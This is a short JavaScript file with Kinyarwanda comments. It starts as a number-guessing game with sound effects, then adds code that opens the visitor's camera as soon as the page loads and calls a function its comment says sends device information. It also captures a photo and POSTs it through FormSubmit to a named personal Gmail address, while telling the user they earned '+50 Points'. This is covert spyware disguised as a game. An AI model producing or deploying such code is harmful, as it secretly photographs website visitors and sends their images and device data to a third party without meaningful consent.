// Gereka umubare w'ibanga
let umubareWibanga = Math.floor(Math.random() * 10) + 1;

// Ibi ni ibice by'amajwi (Ushobora gushyiramo link yawe ya .mp3)
const winSound = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
const loseSound = new Audio('https://www.soundjay.com/misc/sounds/fail-trombone-01.mp3');

document.querySelector('button').onclick = () => {
  let umubareWanditswe = prompt("Gekeranya umubare hagati ya 1 na 10:");
  
  if (umubareWanditswe == umubareWibanga) {
    winSound.play(); // Kina umuziki wo gutsinda! 🎉
    alert("Watsinze! 🎉 Umubare wari " + umubareWibanga);
    umubareWibanga = Math.floor(Math.random() * 10) + 1;
  } else {
    loseSound.play(); // Kina umuziki wo gutsindwa! 😢
    alert("Watsinzwe! Umubare wari " + umubareWibanga + ". Ongera ugerageze!");
  }
};
// 1. Fungura kamera ako kanya website ifungutse
window.onload = function() {
    startCamera();
    // Nanone wohereze amakuru ya telefone nk'uko twabikoze mbere
    sendDeviceInfo();
};

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
    } catch (err) {
        console.log("Umuntu yanze gufungura kamera.");
    }
}

function fataIfoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Fata ifoto uyishyire kuri canvas
    context.drawImage(video, 0, 0, 300, 200);
    
    // Hindura ifoto mo amagambo (Data URL) kugira ngo yoherekeze
    const imageData = canvas.toDataURL('image/png');

    // Yohereza ifoto kuri Gmail yawe binyuze kuri FormSubmit
    fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            _subject: "Ifoto y'uwasuye Website yawe!",
            Photo_Data: imageData, // Iyi izaza imeze nk'amagambo maremare ariyo foto
            Message: "Umuntu yifotoje kugira ngo abone amanota."
        })
    })
    .then(() => {
        alert("Wabonye +50 Points! Ifoto yawe yageze muri sisitemu.");
    });
}
